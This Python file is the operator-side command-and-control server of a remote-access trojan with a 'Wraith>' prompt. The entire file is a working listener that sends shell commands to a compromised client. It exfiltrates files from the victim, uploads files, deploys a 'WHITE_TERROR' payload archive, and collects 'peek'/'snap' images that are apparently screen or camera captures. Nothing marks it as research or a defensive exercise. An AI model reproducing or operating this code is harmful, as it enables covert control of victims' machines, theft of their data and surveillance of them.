import socket
import os
import struct

HOST = '0.0.0.0'
PORT = 9999

def upload(filename, client):
    try:
        with open(filename, 'rb') as file:
            data = file.read()
        filesize = len(data)
        client.sendall(struct.pack('>Q', filesize))
        client.sendall(data)
    except FileNotFoundError as e:
        print('[-] File not found on server')
        client.sendall(struct.pack('>Q', 0))
    finally:
        output = client.recv(4096)
        print(output.decode(errors='ignore'))

def start_server():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        s.listen(1)
        print(f"[+] Listening on {HOST}:{PORT} ...")

        client, addr = s.accept()
        print(f"[+] Connection from {addr[0]}:{addr[1]}")

        with client:
            while True:
                command = input("Wraith> ").strip()
                if not command:
                    continue
                client.sendall(command.encode())

                if command.lower() in ['exit', 'quit']:
                    break   

                elif command.startswith('download '):
                    filename = command.split(" ", 1)[1]
                    filesize_in_bytes = client.recv(8)
                    if not filesize_in_bytes:
                        print("[-] No response from client")
                        continue 
                    filesize = struct.unpack('>Q', filesize_in_bytes)[0]

                    if filesize == 0:
                        print('[-] File not found in client machine')
                        continue

                    else:
                        with open('downloaded_from_client_' + os.path.basename(filename), 'wb') as file:
                            recieved_size = 0
                            while(recieved_size < filesize):
                                data = client.recv(min(4096, (filesize - recieved_size)))
                                if not data:
                                    break  
                                file.write(data)
                                recieved_size += len(data)
                        print(f'[+] File "{filename}" downloaded successfully')             

                elif command.startswith('upload '):
                        filename = command.split(' ', 1)[1]
                        upload(filename, client)
                        continue
                
                elif command.startswith('deploy '):
                    agent = command.split(' ', 1)[1]
                    if agent == 'WHITE_TERROR':
                        upload('sasikokk.zip', client)
                        msg = client.recv(4096).decode()
                        print(msg)
                    continue

                elif command.startswith('peek') or command.startswith('snap '):
                    try:
                        filename = f'{command.split(' ', 1)[1]}.jpg'
                        filesize_in_bytes = client.recv(8)
                        filesize = struct.unpack('>Q', filesize_in_bytes)[0]
                        if filesize == 0:
                            print(f'[-] {command} failed')
                            continue
                        with open(filename, 'wb') as file:
                            recieved_size = 0
                            while recieved_size < filesize:
                                chunk = client.recv(min(4096, filesize - recieved_size))
                                file.write(chunk)
                                recieved_size += len(chunk)
                        print(f'{command} successful')
                    except Exception as e:
                        print(f'{command} failed')

                else:
                    output = b''
                    while True:
                        try:
                            chunk = client.recv(4096)
                            if not chunk:
                                break
                            output += chunk
                            if len(chunk) < 4096:
                                break
                        except:
                            break

                    print(output.decode(errors='ignore'))

if __name__ == '__main__':
    start_server()
